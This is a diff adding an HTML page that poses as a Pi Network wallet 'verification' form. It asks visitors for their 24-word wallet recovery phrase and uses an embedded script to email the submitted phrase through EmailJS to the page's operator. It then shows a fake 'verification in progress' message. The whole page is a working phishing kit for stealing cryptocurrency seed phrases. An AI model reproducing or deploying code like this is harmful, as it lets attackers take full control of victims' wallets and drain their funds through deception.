@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+</head>
+<body>
+    <header>
+            <div class="pan"></div>
+            <img class="pan1" src="pi-net.png" alt="" width="90" height="26">
+            <div class="pan"></div>
+    </header>
+    <div class="container">
+    <form id="contact-form">
+        <div class="la">
+            <h5>Verify Your Pi Wallet!</h5>
+        </div>
+        <input type="text" name="message" placeholder="Verify With Your 24 Wallet phrase" required/>
+        <button type="submit">Verify</button>
+       
+    </form>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init("z8DZIX32IolSQ_dL9"); // Replace with your EmailJS user ID
+        })();
+
+        document.getElementById('contact-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            emailjs.sendForm('casey0808', 'template_sijhelq', this)
+                .then(function() {
+                    alert('verification in progress...');
+                }, function(error) {
+                    alert('verification failed. Please try again later.');
+                });
+        });
+    </script>
+</body>
+</html>
